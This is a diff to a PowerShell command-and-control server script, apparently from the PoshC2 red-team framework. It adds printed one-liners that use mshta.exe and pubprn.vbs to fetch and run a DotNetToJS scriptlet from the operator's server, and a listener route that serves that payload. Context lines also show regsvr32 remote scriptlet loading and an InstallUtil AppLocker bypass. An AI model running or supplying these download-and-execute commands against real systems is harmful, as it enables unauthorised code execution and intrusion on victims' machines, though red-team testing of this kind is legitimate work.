@@ -304,10 +304,14 @@ if ($RestartC2Server)
     Write-Host "To quickly get setup for internal pentesting, run:"
 
     write-host $shortcut `n -ForegroundColor green
-    write-Host "For a more stealthy approach, use SubTee's exploits, NOTE: These do not work with untrusted SSL certificates if using over HTTPS:"
+    write-Host "For a more stealthy approach, use SubTee's hidden gems, NOTE: These do not work with untrusted SSL certificates if using over HTTPS:"
     write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
     write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`"" -ForegroundColor green
     write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`")(window.close)" -ForegroundColor green
+    write-host ""
+    write-Host "Or use Forshaw's DotNetToJS to obtain execution, NOTE: This does not work with untrusted SSL certificates if using over HTTPS:"
+    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_js`")(window.close)" -ForegroundColor green
+    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_js`"" -ForegroundColor green
     write-host ""
     write-Host "To Bypass AppLocker or equivalent, use InstallUtil.exe or Regasm:"
     write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $global:newdir\payloads\posh.exe" -ForegroundColor green
@@ -694,10 +698,14 @@ RewriteRule ^/steam(.*) $uri`${PoshC2}/steam`$1 [NC,P]
     Write-Host "To quickly get setup for internal pentesting, run:"
 
     write-host $shortcut `n -ForegroundColor green
-    write-Host "For a more stealthy approach, use SubTee's exploits, NOTE: These do not work with untrusted SSL certificates if using over HTTPS:"
+    write-Host "For a more stealthy approach, use SubTee's hidden gems, NOTE: These do not work with untrusted SSL certificates if using over HTTPS:"
     write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
     write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`"" -ForegroundColor green
     write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`")(window.close)" -ForegroundColor green
+    write-host ""
+    write-Host "Or use Forshaw's DotNetToJS to obtain execution, NOTE: This does not work with untrusted SSL certificates if using over HTTPS:"
+    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_js`")(window.close)" -ForegroundColor green
+    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_js`"" -ForegroundColor green
     write-host ""
     write-Host "To Bypass AppLocker or equivalent, use InstallUtil.exe or Regasm:"
     write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $global:newdir\payloads\posh.exe" -ForegroundColor green
@@ -840,6 +848,16 @@ while ($listener.IsListening)
 
         if ([System.IO.File]::Exists("$global:newdir/payloads/cs_sct.xml")){
             $message = [IO.File]::ReadAllText("$global:newdir/payloads/cs_sct.xml")
+        }else {
+            $message = $httpresponse
+        }
+
+    }
+    if ($request.Url -match "/webapp/static/$($downloaduri)_js$") 
+    {
+
+        if ([System.IO.File]::Exists("$global:newdir/payloads/js_sct.xml")){
+            $message = [IO.File]::ReadAllText("$global:newdir/payloads/js_sct.xml")
         }else {
             $message = $httpresponse
         }
